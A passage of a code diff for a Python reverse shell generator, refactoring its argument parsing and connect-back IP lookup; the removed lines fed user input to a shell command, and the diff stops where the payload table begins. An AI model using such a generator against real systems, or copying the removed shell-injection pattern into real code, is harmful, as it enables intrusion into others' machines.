@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
 from base64 import b64encode
+from fcntl import ioctl
+from struct import pack
 
 import argparse
 import re
 import socket
-import subprocess
 import sys
 import time
 
@@ -16,14 +17,15 @@ def parse_options():
     parser.add_argument("-i",
                         "--ipaddr",
                         type=str,
-                        default="127.0.0.1",
-                        help="IP address or interface to connect back to")
+                        help="IP address or interface to connect back to",
+                        required=True)
     parser.add_argument("-p", "--port", type=int, default=4444, help="Port to connect back to")
     parser.add_argument("-t",
                         "--type",
                         type=str,
                         help="Type of reverse shell to generate",
-                        dest='shell_type')
+                        dest='shell_type',
+                        required=True)
     parser.add_argument("-li",
                         "--listen",
                         action="store_true",
@@ -39,37 +41,32 @@ def parse_options():
                         help="Generate all the shells!",
                         dest='all_shells')
     args = parser.parse_args()
-    # Print help if there is absolutely nothing passed from CLI
-    if args.all_shells == False and args.ipaddr == None and args.port == None and args.shell_list == False and args.shell_type == None:
-        print(parser.print_help())
+
     return args
 
 
-def main(args):
-    if args.ipaddr or args.port != None:
-        if len(args.ipaddr.split(".")) != 4:
-            try:
-                cmd = f"ip addr show dev {args.ipaddr}"
-                iface_info = subprocess.Popen(args=cmd,
-                                              shell=True,
-                                              stdout=subprocess.PIPE,
-                                              stderr=subprocess.STDOUT)
-                #print(iface_info.stdout.read().decode())
-                ipaddr = re.search("inet\s((?:[\d]{1,3}.){3}\d{1,3})",
-                                   iface_info.stdout.read().decode())
+def get_ip(ip_iface: str) -> str:
+    # Check if valid ip address
+    if re.match(r'(^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)', ip_iface):
+        return ip_iface
 
-                #Check and set IP
-                if ipaddr == None:
-                    print(f"[X] {args.ipaddr} is not a valid interface name or ip address!")
-                    sys.exit(1337)
-                else:
-                    ipaddr = ipaddr[1]
-            except Exception as e:
-                print("[X]" + e)
-                sys.exit(31337)
-        else:
-            ipaddr = args.ipaddr
-        port = args.port
+    # Get ip address from interface
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        ip_iface = socket.inet_ntoa(
+            ioctl(
+                s.fileno(),
+                0x8915,  # SIOCGIFADDR
+                pack('256s', ip_iface[:15].encode()))[20:24])
+        return ip_iface
+    except Exception as e:
+        print(e, file=sys.stderr)
+        sys.exit(1)
+
+
+def main(args):
+    ipaddr = get_ip(args.ipaddr)
+    port = args.port
 
     shells = {
         'asp':
